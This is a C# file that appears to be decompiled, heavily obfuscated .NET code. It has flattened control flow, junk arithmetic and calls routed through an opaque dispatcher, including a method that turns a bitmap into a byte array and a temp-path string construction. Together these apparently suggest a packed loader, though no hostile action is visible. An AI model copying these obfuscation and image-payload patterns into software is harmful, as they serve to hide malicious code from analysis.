using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

public class GClass0
{
	public void method_0()
	{
		Class28.smethod_0(4811135, this, null);
	}

	public object method_1(string string_0, ref MessageBox messageBox_0)
	{
		while (true)
		{
			int num = GClass6.smethod_0(44);
			int num2 = 10;
			while (true)
			{
				IL_0162:
				num2 ^= 0x35;
				int num3;
				while (true)
				{
					num3 = GClass6.smethod_0(35);
					switch (num3 ^ 0x39)
					{
					case -52:
						goto end_IL_0006;
					case -51:
						goto IL_0156;
					case -50:
						goto IL_0162;
					case -53:
						while (true)
						{
							num3 = -14;
							num3 = -53;
						}
					}
					continue;
					end_IL_0006:
					break;
				}
				switch (num2)
				{
				case 60:
					goto IL_0059;
				case 61:
					goto IL_013c;
				case 63:
					goto IL_0141;
				case 62:
					goto end_IL_0162;
				}
				num3 = -12;
				num3 = -51;
				goto IL_0156;
				IL_0141:
				num ^= 0x3B;
				num2 = 9;
				num3 = -9;
				num3 = -50;
				continue;
				IL_0156:
				num2 = 9;
				num3 = -9;
				num3 = -50;
				continue;
				IL_013c:
				num2 = 8;
				continue;
				IL_0059:
				switch (num)
				{
				default:
					num2 = 11;
					continue;
				case -58:
					num = -15;
					break;
				case -57:
					num = -4;
					break;
				case -56:
					num = -24;
					break;
				case -55:
					_ = Environment.CurrentDirectory;
					num = -12;
					break;
				case -54:
					num = -17;
					break;
				case -53:
					num = -22;
					break;
				case -52:
					num = -29;
					break;
				case -51:
					num = -13;
					break;
				case -50:
					num = -18;
					break;
				case -48:
					Versioned.IsNumeric((object)708);
					num = -14;
					break;
				case -47:
					num = -9;
					break;
				case -46:
					num = GClass6.smethod_0(35);
					break;
				case -45:
					num = -3;
					break;
				case -44:
					num = -20;
					break;
				case -43:
					num = -10;
					break;
				case -49:
				case -42:
					num = -16;
					break;
				case -41:
					num = -21;
					break;
				case -40:
					_ = Path.GetTempPath() + string_0;
					Application.get_StartupPath();
					return 7;
				}
				goto IL_0141;
				continue;
				end_IL_0162:
				break;
			}
		}
	}

	public static byte[] smethod_0(Bitmap bitmap_0, IntPtr intptr_0, int int_0)
	{
		return (byte[])Class28.smethod_0(4812098, null, bitmap_0, intptr_0, int_0);
	}

	public static object smethod_1(byte[] byte_0, string string_0)
	{
		return Class28.smethod_0(4804877, null, byte_0, string_0);
	}

	public void method_2()
	{
		Class28.smethod_0(4805407, this, null);
	}

	public object method_3()
	{
		return Class28.smethod_0(4806454, this, null);
	}
}
